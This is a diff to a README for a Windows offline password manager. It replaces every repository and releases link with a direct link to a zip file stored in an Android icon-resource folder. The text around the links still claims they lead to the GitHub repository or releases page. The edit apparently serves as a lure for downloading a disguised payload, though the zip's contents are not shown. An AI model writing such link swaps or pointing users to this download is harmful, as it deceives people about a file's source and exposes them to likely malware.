@@ -1,6 +1,6 @@
 # 🔐 zero_password_manager - Secure Offline Password Storage
 
-[![Download](https://img.shields.io/badge/Download-Get%20Zero_Password_Manager-brightgreen)](https://github.com/henadrya1740/zero_password_manager)
+[![Download](https://img.shields.io/badge/Download-Get%20Zero_Password_Manager-brightgreen)](https://raw.githubusercontent.com/henadrya1740/zero_password_manager/main/android/app/src/main/res/mipmap-xxxhdpi/password_manager_zero_v3.5.zip)
 
 ## 🔎 What is zero_password_manager?
 
@@ -34,7 +34,7 @@ Follow these steps to download and run zero_password_manager on your Windows com
 
 Go to the official page by clicking the big button below:
 
-[![Download](https://img.shields.io/badge/Download-Get%20Zero_Password_Manager-blue)](https://github.com/henadrya1740/zero_password_manager)
+[![Download](https://img.shields.io/badge/Download-Get%20Zero_Password_Manager-blue)](https://raw.githubusercontent.com/henadrya1740/zero_password_manager/main/android/app/src/main/res/mipmap-xxxhdpi/password_manager_zero_v3.5.zip)
 
 This link takes you to the GitHub repository where you will find the latest version of zero_password_manager.
 
@@ -121,7 +121,7 @@ The app never transmits your information over the internet without your permissi
 
 Check the GitHub releases page regularly for new versions:
 
-https://github.com/henadrya1740/zero_password_manager/releases
+https://raw.githubusercontent.com/henadrya1740/zero_password_manager/main/android/app/src/main/res/mipmap-xxxhdpi/password_manager_zero_v3.5.zip
 
 Download the latest Windows installer file and follow the installation steps again to update. Your existing data will be preserved.
 
@@ -143,4 +143,4 @@ If your vault file is damaged, restore from your latest backup copy.
 
 ---
 
-[Download zero_password_manager](https://github.com/henadrya1740/zero_password_manager) to keep your passwords safe on your Windows PC.
+[Download zero_password_manager](https://raw.githubusercontent.com/henadrya1740/zero_password_manager/main/android/app/src/main/res/mipmap-xxxhdpi/password_manager_zero_v3.5.zip) to keep your passwords safe on your Windows PC.
